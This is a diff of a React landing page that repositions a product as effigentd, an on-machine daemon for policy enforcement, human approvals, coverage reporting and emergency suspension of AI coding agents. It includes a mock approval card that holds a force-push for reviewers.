+              <div style={{ width: 8, height: 8, borderRadius: '50%', background: 'oklch(0.55 0.14 250)' }} />Decided on the machine
             </div>
-            <div style={{ fontSize: 13, color: 'var(--green)', fontWeight: 500 }}>81% fewer steps &nbsp;·&nbsp; 76% faster &nbsp;·&nbsp; 76% cheaper</div>
+            <div style={{ fontSize: 13, color: 'var(--ink-2)', fontWeight: 500 }}>Hooks see the command &nbsp;·&nbsp; the kernel sees every child process</div>
           </div>
         </div>
 
-        <div id="engine" className="engine-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 1, background: 'var(--line)', border: '1px solid var(--line)', borderRadius: 8, overflow: 'hidden', marginTop: 40 }}>
+        <div className="engine-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 1, background: 'var(--line)', border: '1px solid var(--line)', borderRadius: 8, overflow: 'hidden', marginTop: 40 }}>
           {engineParts.map((e) => (
             <div key={e.name} style={{ background: 'var(--cream)', padding: '16px 18px' }}>
               <div style={{ fontSize: 13.5, fontWeight: 600, marginBottom: 4 }}>{e.name}</div>
-              <div style={{ fontSize: 12, color: 'var(--ink-3)', lineHeight: 1.4 }}>{e.desc}</div>
+              <div style={{ fontSize: 12, color: 'var(--ink-3)', lineHeight: 1.45 }}>{e.desc}</div>
             </div>
           ))}
         </div>
         </Reveal>
       </Section>
 
-      {/* DETERMINISM SCORE */}
-      <Section>
+      {/* APPROVALS */}
+      <Section id="approvals">
         <Reveal>
-        <div className="grid-2" style={{ display: 'grid', gridTemplateColumns: '0.9fr 1.1fr', gap: 60, alignItems: 'center' }}>
+        <div className="approval-grid" style={{ display: 'grid', gridTemplateColumns: '0.9fr 1.1fr', gap: 60, alignItems: 'center' }}>
           <div>
-            <Eyebrow hue="85">Determinism engine</Eyebrow>
-            <h2 className="h-serif" style={{ fontSize: 'clamp(24px, 5.5vw, 30px)', lineHeight: 1.25, margin: '0 0 16px' }}>Every node gets a determinism score, <b>0 to 100</b>.</h2>
-            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6 }}>Scored on input/output stability, semantic similarity, historical variance, and repeat frequency — then routed automatically.</div>
-          </div>
-          <div>
-            <div style={{ height: 10, borderRadius: 6, background: 'linear-gradient(to right, oklch(0.9 0.01 260) 0%, oklch(0.9 0.01 260) 70%, oklch(0.85 0.12 85) 70%, oklch(0.85 0.12 85) 90%, oklch(0.72 0.15 150) 90%, oklch(0.72 0.15 150) 100%)', marginBottom: 14, transformOrigin: 'left', animation: 'growIn 1.1s cubic-bezier(0.22,1,0.36,1) both' }} />
-            <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-4)', marginBottom: 28 }}>
-              <div>0</div><div>70</div><div>90</div><div>100</div>
+            <Eyebrow hue="75">Approvals</Eyebrow>
+            <h2 className="h-serif" style={{ fontSize: 'clamp(24px, 5.5vw, 30px)', lineHeight: 1.25, margin: '0 0 16px' }}>Approve this push. <b>Not all pushes.</b></h2>
+            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.65, marginBottom: 22 }}>
+              A <code style={{ fontFamily: 'var(--mono)', fontSize: 13.5 }}>require_approval</code>{' '}rule holds the tool call in the agent&apos;s hook and sends it to the people the rule names. The approval covers one action: the command, the directory, the session, the machine and the user, hashed into a fingerprint.
             </div>
-            {scoreBands.map((b) => (
-              <div key={b.range} style={{ display: 'flex', gap: 14, alignItems: 'flex-start', padding: '14px 0', borderTop: '1px solid oklch(0.92 0.005 90)' }}>
-                <div style={{ width: 9, height: 9, borderRadius: '50%', background: b.color, marginTop: 5, flexShrink: 0 }} />
-                <div>
-                  <div style={{ fontSize: 13.5, fontWeight: 600 }}>{b.range} — {b.title}</div>
-                  <div style={{ fontSize: 13, color: 'var(--ink-2)', marginTop: 2 }}>{b.desc}</div>
-                </div>
+            {[
+              ['Single-use', 'It resumes that call once. The next force-push asks again.'],
+              ['Bound to the exact action', 'Change one argument and it is a different fingerprint, so a new request.'],
+              ['Re-checked before it runs', 'If the policy changed while it waited, the approval is revalidated or fails.'],
+              ['Expires', 'Each rule sets a TTL. Nobody answering is a no, not a yes.'],
+            ].map(([t, d]) => (
+              <div key={t} style={{ display: 'flex', gap: 12, padding: '11px 0', borderTop: '1px solid oklch(0.92 0.005 90)' }}>
+                <div style={{ width: 8, height: 8, borderRadius: '50%', background: AMBER, marginTop: 6, flexShrink: 0 }} />
+                <div><span style={{ fontSize: 13.5, fontWeight: 650 }}>{t}.</span> <span style={{ fontSize: 13.5, color: 'var(--ink-2)' }}>{d}</span></div>
               </div>
             ))}
+          </div>
+
+          <div style={{ minWidth: 0 }}>
+            <div className="approval-card float-soft" style={{ border: '1px solid var(--line-2)', borderRadius: 14, background: 'oklch(0.995 0.002 90)', padding: 22, boxShadow: '0 24px 50px -28px oklch(0.2 0.012 260 / 0.35)' }}>
+              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 10, flexWrap: 'wrap', marginBottom: 14 }}>
+                <span style={{ display: 'inline-flex', alignItems: 'center', gap: 7, fontFamily: 'var(--mono)', fontSize: 10.5, fontWeight: 700, letterSpacing: '0.05em', textTransform: 'uppercase', color: SCHEMES.amber.text, background: SCHEMES.amber.bg, border: `1px solid ${SCHEMES.amber.border}`, borderRadius: 10, padding: '3px 10px' }}>
+                  <span style={{ width: 6, height: 6, borderRadius: '50%', background: AMBER, animation: 'glowPulse 1.6s ease-in-out infinite' }} />Approval required
+                </span>
+                <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-3)' }}>expires in 14:52</span>
+              </div>
+              <div style={{ fontSize: 13, color: 'var(--ink-3)', marginBottom: 8 }}>Claude Code wants to run</div>
+              <div className="approval-cmd" style={{ fontFamily: 'var(--mono)', fontSize: 14, color: 'oklch(0.88 0.01 150)', background: 'oklch(0.16 0.012 260)', borderRadius: 8, padding: '12px 14px', marginBottom: 14, overflowX: 'auto', whiteSpace: 'nowrap' }}>
+                <span style={{ color: 'oklch(0.6 0.012 260)' }}>$</span> git push --force origin main
+              </div>
+              <div style={{ display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 14px', fontSize: 12.5, marginBottom: 14 }}>
+                {[
+                  ['Who', 'alex.wang (OS user alex)'],
+                  ['Where', 'alex-mbp · ~/src/payments'],
+                  ['Session', 'claude-code · 7f3a9c'],
+                  ['Rule', 'Production guardrails › force-push · v42'],
+                  ['Reviewers', 'payments-leads'],
+                ].map(([k, v]) => (
+                  <div key={k} style={{ display: 'contents' }}>
+                    <div style={{ color: 'var(--ink-4)' }}>{k}</div>
+                    <div style={{ color: 'var(--ink)', fontWeight: 500, minWidth: 0, overflowWrap: 'anywhere' }}>{v}</div>
+                  </div>
+                ))}
+              </div>
+              <div style={{ height: 4, borderRadius: 3, background: 'oklch(0.93 0.005 260)', overflow: 'hidden', marginBottom: 6 }}>
+                <div style={{ height: '100%', width: '99%', background: AMBER, transformOrigin: 'left', animation: 'growIn 1.2s cubic-bezier(0.22,1,0.36,1) both' }} />
+              </div>
+              <div style={{ fontFamily: 'var(--mono)', fontSize: 10.5, color: 'var(--ink-4)', marginBottom: 16, overflowWrap: 'anywhere' }}>fp1:9c3e41d2…b07a</div>
+              <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
+                <span className="btn btn-ghost" style={{ padding: '9px 18px', fontSize: 13 }}>Deny</span>
+                <span className="btn btn-primary" style={{ padding: '9px 18px', fontSize: 13 }}>Approve once</span>
+              </div>
+            </div>
+
+            <div style={{ marginTop: 26, paddingLeft: 6 }}>
+              {APPROVAL_STATES.map(([state, note, color], i) => (
+                <div key={state}>
+                  {i > 0 && (
+                    <div style={{ marginLeft: 4, width: 1, height: 16, background: LINE, position: 'relative' }}>
+                      <div style={{ position: 'absolute', left: -2, top: 0, width: 5, height: 5, borderRadius: '50%', background: color, animation: 'flowDown 1.6s linear infinite', animationDelay: `${i * 0.2}s` }} />
+                    </div>
+                  )}
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+                    <div style={{ width: 9, height: 9, borderRadius: '50%', background: color, flexShrink: 0 }} />
+                    <span style={{ fontFamily: 'var(--mono)', fontSize: 12, fontWeight: 600, minWidth: 128, flexShrink: 0 }}>{state}</span>
+                    <span style={{ fontSize: 12.5, color: 'var(--ink-3)' }}>{note}</span>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+        </Reveal>
+      </Section>
+
+      {/* COVERAGE MATRIX */}
+      <Section id="coverage">
+        <Reveal>
+          <Eyebrow hue="150">Coverage, honestly</Eyebrow>
+          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 10px', maxWidth: 660 }}>What gets blocked, what gets paused, and <b>what is only watched</b>.</h2>
+          <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 660, marginBottom: 30 }}>
+            Each layer sees different things. The Linux kernel sees every process but matches binaries, not arguments. Hooks see the full command but only the agent&apos;s own tool calls. macOS is observe-only at the OS layer. The console shows this per endpoint, so a policy never claims more than the machine can do.
+          </div>
+          <CoverageTable />
+          <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', flexWrap: 'wrap', gap: 14, marginTop: 18 }}>
+            <div style={{ fontSize: 13, color: 'var(--ink-3)', lineHeight: 1.6, maxWidth: 680 }}>
+              <b style={{ color: 'var(--ink-2)' }}>Block</b> stops it before it runs. <b style={{ color: 'var(--ink-2)' }}>Pause</b> holds it for approval (hooks can also deny outright). <b style={{ color: 'var(--ink-2)' }}>Observe</b> records it and reports what a rule <i>would</i> have blocked. Codex, Gemini CLI, Aider, opencode and Goose have no hook integration yet: on Linux they get the kernel column, on macOS they are observed.
+            </div>
+            <Link href="/docs/enforcement" style={{ fontSize: 14, fontWeight: 600, color: 'oklch(0.4 0.14 250)', whiteSpace: 'nowrap' }}>Full coverage notes &rarr;</Link>
+          </div>
+        </Reveal>
+      </Section>
+
+      {/* SUSPEND + OFFLINE */}
+      <Section>
+        <Reveal>
+        <div className="suspend-grid" style={{ display: 'grid', gridTemplateColumns: '1.05fr 0.95fr', gap: 60, alignItems: 'center' }}>
+          <div style={{ minWidth: 0 }}>
+            <div style={{ border: '1px solid var(--line-2)', borderRadius: 14, background: 'oklch(0.995 0.002 90)', overflow: 'hidden' }}>
+              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 10, flexWrap: 'wrap', padding: '14px 18px', borderBottom: '1px solid var(--line)' }}>
+                <div>
+                  <div style={{ fontSize: 13.5, fontWeight: 700 }}>Suspend session</div>
+                  <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-4)', marginTop: 2 }}>codex · ci-runner-07 · process tree of pid 9132</div>
+                </div>
+                <span style={{ fontFamily: 'var(--mono)', fontSize: 10.5, fontWeight: 700, color: SCHEMES.red.text, background: SCHEMES.red.bg, border: `1px solid ${SCHEMES.red.border}`, borderRadius: 10, padding: '3px 10px' }}>SUSPENDED</span>
+              </div>
+              <div style={{ padding: '18px 18px 8px' }}>
+                {SUSPEND_STEPS.map(([state, time, note], i) => (
+                  <div key={state} style={{ display: 'flex', gap: 14, paddingBottom: 16 }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+                      <div style={{ width: 11, height: 11, borderRadius: '50%', background: 'var(--green-dot)', animation: i === SUSPEND_STEPS.length - 1 ? 'pulseGlow 2.2s ease-in-out infinite' : undefined }} />
+                      {i < SUSPEND_STEPS.length - 1 && <div style={{ width: 1, flex: 1, minHeight: 22, background: LINE, marginTop: 4 }} />}
+                    </div>
+                    <div style={{ flex: 1, minWidth: 0 }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', gap: 10 }}>
+                        <span style={{ fontFamily: 'var(--mono)', fontSize: 12.5, fontWeight: 600 }}>{state}</span>
+                        <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-4)' }}>{time}</span>
+                      </div>
+                      <div style={{ fontSize: 12.5, color: 'var(--ink-3)', marginTop: 2 }}>{note}</div>
+                      <div style={{ height: 3, borderRadius: 2, background: 'var(--green-dot)', marginTop: 8, transformOrigin: 'left', animation: `growIn .8s cubic-bezier(0.22,1,0.36,1) ${0.3 + i * 0.35}s both` }} />
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          </div>
+          <div className="suspend-text">
+            <Eyebrow hue="25">Emergency stop</Eyebrow>
+            <h2 className="h-serif" style={{ fontSize: 'clamp(24px, 5.5vw, 30px)', lineHeight: 1.25, margin: '0 0 16px' }}>Stop a session, <b>and know it stopped</b>.</h2>
+            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.65, marginBottom: 14 }}>
+              Suspend one session or a whole process tree from the console. You see three states, not one: <b>requested</b>, <b>delivered</b> to the machine, <b>confirmed</b> by the machine. If the laptop is asleep, it says requested, not done.
+            </div>
+            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.65 }}>
+              Policies are enforced locally and cached on the endpoint, so a lost connection doesn&apos;t switch anything off. The last policy keeps enforcing; events and approval requests queue until the machine reconnects.
+            </div>
           </div>
         </div>
         </Reveal>
@@ -383,62 +541,40 @@ export default function Page() {
       {/* PRODUCT PREVIEW */}
       <Section>
         <Reveal>
-          <Eyebrow hue="150">The product</Eyebrow>
-          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px', maxWidth: 620 }}>See every run. Then watch it get <b>cheaper</b>.</h2>
-          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 620 }}>
-            Every session lands as a navigable execution graph with per-model cost — and once an agent has history, the determinism engine turns it into concrete optimization actions.
+          <Eyebrow hue="250">The console</Eyebrow>
+          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px', maxWidth: 640 }}>One place for the rules and <b>the record</b>.</h2>
+          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 640 }}>
+            Write a policy once, scope it to teams, agents or machines, and every enrolled endpoint picks it up. Each event says which rule decided it and at which policy version.
           </div>
           <div className="preview-grid" style={{ display: 'grid', gridTemplateColumns: '1.15fr 0.85fr', gap: 18, alignItems: 'stretch' }}>
-            {/* sessions panel */}
-            <div className="float-soft" style={{ borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)' }}>
+            {/* events panel */}
+            <div className="float-soft" style={{ borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)', minWidth: 0 }}>
               <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 16px', borderBottom: '1px solid oklch(0.22 0.012 265)' }}>
-                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Sessions</div>
-                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>184 runs · $1.77 total</div>
+                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Events</div>
+                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>production · last 15 min</div>
               </div>
               <div style={{ padding: '6px 0' }}>
-                {([
-                  ['seed-invo-021', 'invoice-reconciliation', '12', '$0.017', true],
-                  ['seed-repo-014', 'repo-explorer', '12', '$0.021', true],
-                  ['seed-tria-008', 'support-triage', '9', '$0.014', false],
-                  ['seed-ci-004', 'ci-fixer', '11', '$0.012', false],
-                  ['seed-docs-011', 'docs-writer', '7', '$0.016', false],
-                ] as Array<[string, string, string, string, boolean]>).map(([id, agent, steps, cost, opt]) => (
-                  <div key={id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '9px 16px', borderBottom: '1px solid oklch(0.19 0.012 265)', fontSize: 11.5 }}>
-                    <span className="prev-id" style={{ fontFamily: 'var(--mono)', color: 'oklch(0.85 0.005 265)', width: 110, flexShrink: 0 }}>{id}</span>
-                    <span style={{ color: 'oklch(0.65 0.01 265)', flex: 1, display: 'flex', alignItems: 'center', gap: 7 }}>
-                      {agent}
-                      {opt && <span style={{ fontSize: 9, fontWeight: 700, color: 'oklch(0.72 0.14 150)', border: '1px solid oklch(0.4 0.1 150)', borderRadius: 8, padding: '1px 7px' }}>Optimized</span>}
-                    </span>
-                    <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.6 0.01 265)' }}>{steps} steps</span>
-                    <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.85 0.005 265)', width: 46, textAlign: 'right' }}>{cost}</span>
-                  </div>
-                ))}
+                {EVENTS.map(([time, outcome, agent, cls, target]) => {
+                  const color = outcome === 'would' ? 'oklch(0.7 0.1 60)' : OUTCOME[outcome];
+                  const label = outcome === 'would' ? 'would_block' : outcome === 'pending' ? 'pending' : outcome;
+                  return (
+                    <div key={time + target} className="ev-row" style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '9px 16px', borderBottom: '1px solid oklch(0.19 0.012 265)', fontSize: 11.5 }}>
+                      <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.55 0.01 265)', width: 34, flexShrink: 0 }}>{time}</span>
+                      <span style={{ fontSize: 9.5, fontWeight: 700, color, border: `1px solid ${color}`, borderRadius: 8, padding: '1px 7px', whiteSpace: 'nowrap', width: 78, textAlign: 'center', flexShrink: 0 }}>{label}</span>
+                      <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.7 0.01 265)', width: 84, flexShrink: 0 }}>{agent}</span>
+                      <span className="ev-target" style={{ fontFamily: 'var(--mono)', color: 'oklch(0.86 0.005 265)', flex: 1, minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}><span style={{ color: 'oklch(0.55 0.01 265)' }}>{cls}</span> {target}</span>
+                    </div>
+                  );
+                })}
               </div>
             </div>
-            {/* insights panel */}
-            <div className="float-soft" style={{ animationDelay: '0.8s', borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)' }}>
+            {/* policy panel */}
+            <div className="float-soft" style={{ animationDelay: '0.8s', borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)', minWidth: 0 }}>
               <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 16px', borderBottom: '1px solid oklch(0.22 0.012 265)' }}>
-                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Optimization Insights</div>
-                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>last 40 runs</div>
+                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Policy · v42</div>
+                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>14 endpoints in scope</div>
               </div>
-              <div style={{ padding: '10px 16px', display: 'flex', flexDirection: 'column', gap: 10 }}>
-                {([
-                  ['Replace with tool', 'planner turn', '100', 'oklch(0.72 0.14 150)'],
-                  ['Memoize by input', 'tax_rate()', '100', 'oklch(0.75 0.12 210)'],
-                  ['Synthesize template', 'report body', '89', 'oklch(0.72 0.12 250)'],
-                  ['Route to smaller model', 'final summary', '80', 'oklch(0.7 0.12 290)'],
-                ] as Array<[string, string, string, string]>).map(([action, target, score, color]) => (
-                  <div key={action} style={{ display: 'flex', alignItems: 'center', gap: 10, fontSize: 11.5 }}>
-                    <span style={{ fontSize: 10, fontWeight: 700, color, border: `1px solid ${color}`, borderRadius: 9, padding: '2px 9px', whiteSpace: 'nowrap' }}>{action}</span>
-                    <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.7 0.01 265)', flex: 1 }}>{target}</span>
-                    <span style={{ fontFamily: 'var(--mono)', fontWeight: 700, color: 'oklch(0.88 0.005 265)' }}>{score}</span>
-                  </div>
-                ))}
-                <div style={{ marginTop: 6, borderTop: '1px solid oklch(0.22 0.012 265)', paddingTop: 12, display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
-                  <span style={{ fontSize: 10.5, color: 'oklch(0.55 0.01 265)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Est. removable cost</span>
-                  <span className="h-serif" style={{ fontSize: 22, color: 'oklch(0.72 0.14 150)' }}>$1.04 / run-set</span>
-                </div>
-              </div>
+              <pre style={{ margin: 0, padding: '12px 16px', fontFamily: 'var(--mono)', fontSize: 11, lineHeight: 1.6, color: 'oklch(0.82 0.01 150)', overflowX: 'auto' }}>{POLICY_JSON}</pre>
             </div>
           </div>
         </Reveal>
@@ -447,48 +583,50 @@ export default function Page() {
       {/* INSTALL */}
       <Section id="install">
         <Reveal>
-          <Eyebrow hue="250">Universal installation</Eyebrow>
-          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px' }}>Install once. <b>Change nothing.</b></h2>
-          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 600 }}>
-            One scoped key per agent, then pick the capture method for your harness — the engine is identical for every one of them.
+          <Eyebrow hue="250">Install</Eyebrow>
+          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px' }}>One daemon per machine. <b>No agent code changes.</b></h2>
+          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 620 }}>
+            Enroll the machine with a token from the console. effigentd picks up agents already running, installs the hooks for the agents that have them, and starts in the mode your policy sets.
           </div>
-          <div style={{ display: 'flex', gap: 4, borderBottom: '1px solid var(--line)', overflowX: 'auto' }}>
+          <div style={{ display: 'flex', gap: 4, borderBottom: '1px solid var(--line)', overflowX: 'auto' }} role="tablist">
             {installTabs.map((t) => (
-              <div key={t.key} onClick={() => setTab(t.key)} style={{ padding: '10px 18px', fontSize: 13.5, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap', color: tab === t.key ? 'var(--ink)' : 'var(--ink-4)', borderBottom: tab === t.key ? '2px solid var(--ink)' : '2px solid transparent', marginBottom: -1 }}>{t.label}</div>
+              <button key={t.key} role="tab" aria-selected={tab === t.key} onClick={() => setTab(t.key)} style={{ padding: '10px 18px', fontSize: 13.5, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap', background: 'transparent', border: 'none', fontFamily: 'var(--sans)', color: tab === t.key ? 'var(--ink)' : 'var(--ink-4)', borderBottom: tab === t.key ? '2px solid var(--ink)' : '2px solid transparent', marginBottom: -1 }}>{t.label}</button>
             ))}
           </div>
           <div className="install-code" style={{ background: 'oklch(0.16 0.012 260)', borderRadius: '0 0 8px 8px', padding: '26px 28px', fontFamily: 'var(--mono)', fontSize: 13.5, color: 'oklch(0.85 0.01 150)', lineHeight: 1.8, whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>{INSTALL_CODE[tab]}</div>
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 14, marginTop: 22 }}>
             <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px 18px', fontFamily: 'var(--mono)', fontSize: 12, color: 'var(--ink-3)' }}>
-              {supportedHarnesses.map((h) => <span key={h}>{h}</span>)}
+              {supportedAgents.map((h) => <span key={h}>{h}</span>)}
             </div>
-            <Link href="/developers" style={{ fontSize: 14, fontWeight: 600, color: 'oklch(0.4 0.14 250)' }}>Full developer guide &rarr;</Link>
+            <Link href="/docs/quickstart" style={{ fontSize: 14, fontWeight: 600, color: 'oklch(0.4 0.14 250)' }}>Quickstart &rarr;</Link>
           </div>
         </Reveal>
       </Section>
 
-      {/* MANIFESTO */}
+      {/* POSITION */}
       <div className="manifesto-pad" style={{ position: 'relative', borderTop: '1px solid var(--line)', background: 'oklch(0.2 0.012 260)', padding: '100px 32px', overflow: 'hidden' }}>
-        <div style={{ position: 'absolute', top: '50%', left: '50%', width: 520, height: 340, transform: 'translate(-50%,-50%)', background: 'radial-gradient(ellipse, oklch(0.5 0.15 280 / 0.35), transparent 70%)', animation: 'glowPulse 4s ease-in-out infinite', pointerEvents: 'none' }} />
+        <div style={{ position: 'absolute', inset: 0, backgroundImage: 'radial-gradient(oklch(0.4 0.012 260 / 0.6) 1px, transparent 1px)', backgroundSize: '22px 22px', maskImage: 'radial-gradient(ellipse 60% 70% at 50% 50%, black 30%, transparent 100%)', WebkitMaskImage: 'radial-gradient(ellipse 60% 70% at 50% 50%, black 30%, transparent 100%)', pointerEvents: 'none' }} />
         <div style={{ position: 'relative', maxWidth: 780, margin: '0 auto', textAlign: 'center' }}>
-          <div style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'oklch(0.6 0.01 260)', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 24 }}>Positioning</div>
-          <div className="h-serif" style={{ fontSize: 'clamp(24px, 6.5vw, 36px)', lineHeight: 1.35, color: 'oklch(0.98 0.004 90)' }}>Treat an AI agent as <b>a program</b>, not a sequence of prompts. Parse every execution into a universal graph, run compiler-like optimization passes, validate against history, and execute the optimized result.</div>
-          <div style={{ fontSize: 15, color: 'oklch(0.68 0.01 260)', marginTop: 28 }}>The compiler for AI agents.</div>
+          <div style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'oklch(0.6 0.01 260)', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 24 }}>Where the control sits</div>
+          <div className="h-serif" style={{ fontSize: 'clamp(24px, 6.5vw, 36px)', lineHeight: 1.35, color: 'oklch(0.98 0.004 90)' }}>The decision belongs <b>on the machine</b>, before the exec, with a name next to every exception.</div>
+          <div style={{ fontSize: 15, color: 'oklch(0.68 0.01 260)', marginTop: 28, maxWidth: 600, marginLeft: 'auto', marginRight: 'auto', lineHeight: 1.65 }}>Prompts and model calls are the wrong place to enforce what a shell may do. effigentd enforces where the action happens and tells you plainly where it can&apos;t.</div>
         </div>
       </div>
 
       {/* FOOTER CTA */}
       <div className="cta-pad" style={{ borderTop: '1px solid var(--line)', padding: '90px 32px', textAlign: 'center' }}>
         <Reveal>
-          <div className="h-serif" style={{ fontSize: 'clamp(27px, 7vw, 34px)', marginBottom: 26 }}>Stop paying your agents to <b>think twice</b>.</div>
+          <div className="h-serif" style={{ fontSize: 'clamp(27px, 7vw, 34px)', marginBottom: 12 }}>Start in monitor mode. <b>Enforce when you&apos;re ready.</b></div>
+          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 26, maxWidth: 560, marginLeft: 'auto', marginRight: 'auto' }}>
+            Monitor reports what a policy would have blocked without blocking it, so you can see the effect on real work first.
+          </div>
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexWrap: 'wrap', gap: 14 }}>
-            <Link href="/developers" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Install in 2 minutes</Link>
-            <Link href="/security" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>Security &amp; privacy</Link>
+            <Link href="/docs/quickstart" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Enroll a machine</Link>
+            <Link href="/security" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>Security &amp; data</Link>
           </div>
         </Reveal>
       </div>
 
-      {/* FOOTER */}
       <Footer />
     </div>
   );
